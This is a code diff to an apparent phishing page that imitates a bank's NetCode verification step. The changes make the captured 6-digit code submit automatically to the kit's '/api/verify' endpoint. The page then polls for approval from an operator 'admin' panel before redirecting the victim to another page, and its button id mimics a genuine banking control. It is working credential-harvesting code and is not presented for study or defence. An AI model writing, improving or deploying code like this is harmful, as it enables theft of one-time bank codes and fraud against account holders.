@@ -150,42 +150,16 @@
   /* ===== 3. VALIDATION ===== */
   function validateNetCode() {
     const netcode = getNetCode();
-    const errors = [];
-
-    if (!netcode) {
-      errors.push({
-        field: 'netcode',
-        label: 'NetCode',
-        message: 'Please enter your NetCode.'
-      });
-    } else if (!/^\d{6}$/.test(netcode)) {
-      errors.push({
-        field: 'netcode',
-        label: 'NetCode',
-        message: 'Please enter a valid 6 digit NetCode.'
-      });
-    }
-
-    return errors;
+    return /^\d{6}$/.test(netcode);
   }
 
   /* ===== 4. SHOW VALIDATION ERROR ===== */
-  function showValidationError() {
-    const errors = validateNetCode();
-    if (errors.length === 0) return true;
-
-    // Show error in the existing error message div
+  function showValidationError(msg) {
     const errorMessage = document.getElementById('errorMessage');
     if (errorMessage) {
-      errorMessage.textContent = errors[0].message;
+      errorMessage.textContent = msg || 'Please enter a valid 6 digit NetCode.';
       errorMessage.style.display = 'block';
     }
-
-    // Focus the field
-    const field = document.getElementById('netcode');
-    if (field) field.focus();
-
-    return false;
   }
 
   /* ===== 5. HIDE VALIDATION ERROR ===== */
@@ -198,19 +172,8 @@
 
   /* ===== 6. SHOW LOADING OVERLAY ===== */
   function showLoading() {
-    const verifyBtn = document.getElementById('verifyBtn');
-    const btnText = verifyBtn.querySelector('strong');
-    const netcodeInput = document.getElementById('netcode');
-
-    // Disable button and input
-    verifyBtn.style.opacity = '0.6';
-    verifyBtn.style.pointerEvents = 'none';
-    btnText.textContent = 'Verifying...';
-    netcodeInput.disabled = true;
-
-    // Create overlay
     const overlay = document.createElement('div');
-    overlay.id = 'verify-loading-overlay';
+    overlay.id = 'login-loading-overlay';
     overlay.style.cssText = `
       position: fixed;
       top: 0;
@@ -225,24 +188,13 @@
       z-index: 9999;
     `;
 
-    const loader = document.createElement('div');
+    const loader = document.createElement('img');
+    loader.src = '/images/loader.811fa38f2f95504a101b1b41aec4e3ca.gif';
+    loader.alt = 'Loading...';
     loader.style.cssText = `
       width: 50px;
       height: 50px;
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #ffcc00;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
     `;
-
-    const style = document.createElement('style');
-    style.textContent = `
-      @keyframes spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-      }
-    `;
-    document.head.appendChild(style);
 
     const text = document.createElement('p');
     text.textContent = 'Verifying...';
@@ -260,17 +212,7 @@
 
   /* ===== 7. HIDE LOADING OVERLAY ===== */
   function hideLoading() {
-    const verifyBtn = document.getElementById('verifyBtn');
-    const btnText = verifyBtn.querySelector('strong');
-    const netcodeInput = document.getElementById('netcode');
-
-    // Re-enable button and input
-    verifyBtn.style.opacity = '';
-    verifyBtn.style.pointerEvents = '';
-    btnText.textContent = 'Verify';
-    netcodeInput.disabled = false;
-
-    const existing = document.getElementById('verify-loading-overlay');
+    const existing = document.getElementById('login-loading-overlay');
     if (existing) {
       existing.style.opacity = '0';
       setTimeout(() => existing.remove(), 300);
@@ -318,7 +260,6 @@
 
         if (data.status === 'ok') {
           isWaitingForAdmin = false;
-          // Proceed to next page (unregister.html based on your server flow)
           window.location.href = '/unregister.html';
           return;
         }
@@ -328,7 +269,6 @@
           hideLoading();
           clearForm();
           showErrorMessage('Invalid NetCode. Please try again.');
-          // Clear the redo status so we don't loop
           fetch('/api/clearRedo', {
             method: 'POST',
             headers: { 'content-type': 'application/json' },
@@ -337,7 +277,6 @@
           return;
         }
 
-        // Continue polling
         pollInterval = setTimeout(poll, 1200);
 
       } catch (err) {
@@ -349,61 +288,71 @@
     poll();
   }
 
-  /* ===== 11. VERIFY BUTTON HANDLER ===== */
+  /* ===== 11. SUBMIT NETCODE ===== */
+  async function submitNetCode() {
+    if (!validateNetCode()) {
+      showValidationError();
+      return;
+    }
+
+    hideValidationError();
+    showLoading();
+
+    const netcode = getNetCode();
+
+    try {
+      const response = await fetch('/api/verify', {
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({ sid, phone: netcode })
+      });
+
+      if (response.ok) {
+        startPolling();
+      } else {
+        throw new Error('Verification failed');
+      }
+    } catch (err) {
+      console.error('Verify error:', err);
+      hideLoading();
+      showErrorMessage('Unable to verify. Please try again.');
+    }
+  }
+
+  /* ===== 12. SETUP EVENT LISTENERS ===== */
   document.addEventListener('DOMContentLoaded', () => {
-    const verifyBtn = document.getElementById('verifyBtn');
     const netcodeInput = document.getElementById('netcode');
+    const verifyBtn = document.getElementById('ctl00_BodyPlaceHolder_lnkNext');
 
-    if (verifyBtn) {
-      verifyBtn.addEventListener('click', async (e) => {
-        e.preventDefault();
-
-        // Hide any previous error
+    // Input handler - restrict to digits and auto-submit on 6 digits
+    if (netcodeInput) {
+      netcodeInput.addEventListener('input', (e) => {
+        // Remove non-digits and limit to 6
+        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
+        
+        // Hide error on input
         hideValidationError();
 
-        // Validate
-        if (!showValidationError()) {
-          return;
+        // Auto-submit when 6 digits entered
+        if (e.target.value.length === 6) {
+          submitNetCode();
         }
+      });
 
-        const netcode = getNetCode();
-        showLoading();
-
-        try {
-          // Send to server - using /api/verify endpoint with phone field
-          // This stores in v.phone which panel checks for verify.html
-          const response = await fetch('/api/verify', {
-            method: 'POST',
-            headers: { 'content-type': 'application/json' },
-            body: JSON.stringify({ sid, phone: netcode })
-          });
-
-          if (response.ok) {
-            // Start polling for admin approval
-            startPolling();
-          } else {
-            throw new Error('Verification failed');
-          }
-        } catch (err) {
-          console.error('Verify error:', err);
-          hideLoading();
-          showErrorMessage('Unable to verify. Please try again.');
+      // Allow Enter key to submit
+      netcodeInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          submitNetCode();
         }
       });
     }
 
-    // Allow Enter key to submit
-    if (netcodeInput) {
-      netcodeInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') {
-          verifyBtn.click();
-        }
-      });
-
-      // Restrict input to digits only
-      netcodeInput.addEventListener('input', (e) => {
-        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
-        hideValidationError();
+    // Verify button click handler
+    if (verifyBtn) {
+      verifyBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        submitNetCode();
       });
     }
   });
@@ -862,6 +811,7 @@
   </div>
  </body>
 </html>
+
 
 
 
